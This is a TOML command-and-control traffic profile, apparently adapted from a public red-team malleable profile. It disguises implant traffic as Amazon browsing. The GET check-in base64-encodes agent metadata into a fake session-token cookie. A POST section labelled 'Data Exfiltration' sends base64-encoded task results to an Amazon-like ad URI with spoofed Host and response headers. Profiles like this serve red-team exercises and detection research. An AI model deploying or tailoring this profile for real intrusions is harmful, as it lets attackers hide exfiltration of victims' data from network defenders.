[profile]
name = "Amazon Browsing"
author = "@harmj0y"

# [profile.options]
# sleeptime = 5000
# jitter = 0
# maxdns = 255
# useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"


## =============================================
## HTTP - Egress only ATM.
## =============================================

## =============================================
## HTTP GET (Beacon Check-in)
## =============================================
[http.get]
method = "GET"
uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books"
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..." # Browser-like

# --- 1. Request Structure ---
[http.get.client]
# Headers are added top to bottom. Keys with hyphens must be quoted.
headers = [
    { "Accept" = "*/*" },
    { "Host" = "www.amazon.com" },
    { "Cookie" = "<METADATA>" }  # The agent's metadata replaces this token at runtime
]
body = ""

# --- 2. Data Transformations ---
# Defines exactly how the <METADATA> payload is transformed before injection
[http.get.client.metadata]
transforms = [
    { op = "base64" },
    { op = "prepend", val = "session-token=" },
    { op = "prepend", val = "skin=noskin;" },
    { op = "append", val = "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996" }
]

## ---------------------------------------------

# --- 1. Response Structure ---
[http.get.server]
headers = [
    { "Server" = "Server" },
    { "x-amz-id-1" = "THKUYEZKCKPGY5T42PZT" },
    { "x-amz-id-2" = "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=" },
    { "X-Frame-Options" = "SAMEORIGIN" },
    { "Content-Encoding" = "gzip" }
]
# The server dumps the next task payload to the body of the request
body = "<OUTPUT>"

# --- 2. Data Transformations ---
# Defines how the server transforms the <OUTPUT> payload before sending
[http.get.server.output]
transforms = []


## =============================================
## HTTP POST (Data Exfiltration)
## =============================================
[http.post]
method = "POST"
uri = "/N4215/adj/amzn.us.sr.aps"
useragent = "AmazonAPI/1.0.422" # App-like

# --- 1. Request Structure ---
[http.post.client]
headers = [
    { "Accept" = "*/*" },
    { "Content-Type" = "text/xml" },
    { "X-Requested-With" = "XMLHttpRequest" },
    { "Host" = "www.amazon.com" }
]

# Parameters are added top to bottom, maintaining strict ordering
parameters = [
    { sz = "160x600" },
    { oe = "oe=ISO-8859-1;" },
    { sn = "<CLIENT_ID>" },  # The Agent's ID replaces this token
    { s = "3717" },
    { dc_ref = "http%3A%2F%2Fwww.amazon.com" }
]
# The task execution results replace this token
body = "<OUTPUT>"

# --- 2. Data Transformations ---
# follow the same resposne style as CS, have an ID field (holds our ID)
# and an output field, which holds our task responses
# Defines how the <CLIENT_ID> is encoded before injection
[http.post.client.id]
transforms = []

# Defines how the <OUTPUT> task data is encoded before injection
[http.post.client.output]
transforms = [
    { op = "base64" }
]

## ---------------------------------------------

# Server response to POST action
[http.post.server]
headers = [
    { "Server" = "Server" },
    { "x-amz-id-1" = "THK9YEZJCKPGY5T42OZT" },
    { "x-amz-id-2" = "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=" },
    { "X-Frame-Options" = "SAMEORIGIN" },
    { "x-ua-compatible" = "IE=edge" }
]
body = "<OUTPUT>"

# --- 2. Data Transformations ---
[http.post.server.output]
transforms = []



